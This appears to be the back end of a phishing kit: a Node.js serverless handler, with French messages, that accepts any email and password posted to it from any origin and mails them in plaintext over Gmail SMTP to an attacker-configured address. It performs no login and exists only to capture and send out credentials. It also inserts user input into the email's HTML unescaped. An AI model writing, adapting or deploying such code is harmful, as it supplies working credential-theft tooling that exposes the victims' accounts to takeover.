const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Méthode non autorisée' });
  }

  const { email, password } = req.body || {};

  if (!email || !password) {
    return res.status(400).json({ message: 'Champs manquants' });
  }

  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASSWORD,
    },
  });

  try {
    await transporter.sendMail({
      from: `"Site Connexion" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_TO,
      subject: 'Nouvelle connexion',
      text: `Email : ${email}\nMot de passe : ${password}`,
      html: `<p><strong>Email :</strong> ${email}</p><p><strong>Mot de passe :</strong> ${password}</p>`,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Erreur d\'envoi:', error);
    res.status(500).json({ success: false, error: 'Erreur lors de l\'envoi' });
  }
};
